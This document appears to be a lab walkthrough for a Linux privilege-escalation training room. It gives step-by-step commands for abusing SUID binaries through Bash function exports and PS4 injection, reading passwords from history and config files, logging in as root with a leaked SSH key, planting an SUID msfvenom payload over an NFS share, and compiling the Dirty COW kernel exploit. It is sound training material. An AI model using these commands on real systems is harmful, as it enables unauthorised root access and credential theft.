## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [SUID/SGID Executables - Abusing Shell Features \#1](#SUID/SGID\Executables\-\Abusing\Shell\Features\\#1)
  - [SUID/SGID Executables - Abusing Shell Features \#2](#SUID/SGID\Executables\-\Abusing\Shell\Features\\#2)
    - [Passwords & Keys - History files](#Passwords\&\Keys\-\History\files)
    - [Passwords & Keys - Config Files](#Passwords\&\Keys\-\Config\Files)
    - [Passwords & Keys - SSH Keys](#Passwords\&\Keys\-\SSH\Keys)
    - [NFS](#NFS)
    - [Kernel Exploits](#Kernel\Exploits)

## Table of Contents

  - [SUID/SGID Executables - Abusing Shell Features \#1](#SUID/SGID\Executables\-\Abusing\Shell\Features\\#1)
  - [SUID/SGID Executables - Abusing Shell Features \#2](#SUID/SGID\Executables\-\Abusing\Shell\Features\\#2)
    - [Passwords & Keys - History files](#Passwords\&\Keys\-\History\files)
    - [Passwords & Keys - Config Files](#Passwords\&\Keys\-\Config\Files)
    - [Passwords & Keys - SSH Keys](#Passwords\&\Keys\-\SSH\Keys)
    - [NFS](#NFS)
    - [Kernel Exploits](#Kernel\Exploits)

## SUID/SGID Executables - Abusing Shell Features \#1
The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

**Verify this with strings:**
```bash
strings /usr/local/bin/suid-env2
```

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

**Verify the version of Bash installed on the Debian VM is less than 4.2-048:**
```bash
/bin/bash --version
```

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

`function /usr/sbin/service { /bin/bash -p; }   export -f /usr/sbin/service`

**Run the suid-env2 executable to gain a root shell:**
```bash
/usr/local/bin/suid-env2
```

## SUID/SGID Executables - Abusing Shell Features \#2
	Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.  

Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

`rm /tmp/rootbash   exit`

### Passwords & Keys - History files
If a user accidentally types their password on the command line instead of into a password prompt, it may  get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:
```bash
cat ~/.*history | less
```

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password:

`su root`
### Passwords & Keys - Config Files
Config files often contain passwords in plaintext or other reversible formats

List the contents of the user's home directory:
`ls /home/user`

Note the presence of a `myvpn.ovpn` config file. View the contents fo the file:
`cat /home/user/myvpn.ovpn`

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
`su root`


### Passwords & Keys - SSH Keys
Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:

`ls -la /`

Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:

`ls -l /.ssh`

Note that there is a world-readable file called **root_key**. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the **root_key** file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:

`chmod 600 root_key`

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):

`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.163.143`


### NFS
Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

`cat /etc/exports`

Note that the **/tmp** share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

`sudo su`

Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share (update the IP accordingly):

`mkdir /tmp/nfs   mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`

Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

Still using Kali's root user, make the file executable and set the SUID permission:

`chmod +xs /tmp/nfs/shell.elf`

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`

**What is the name of the option that disables root squashing?**
> `no_root_squash`


### Kernel Exploits
Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:

`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at **/home/user/tools/kernel-exploits/dirtycow/c0w.c**. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):

`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w   ./c0w`

Once the exploit completes, run /usr/bin/passwd to gain a root shell:

`/usr/bin/passwd`

Remember to restore the original **/usr/bin/passwd** file and exit the root shell before continuing!

`mv /tmp/bak /usr/bin/passwd   exit`



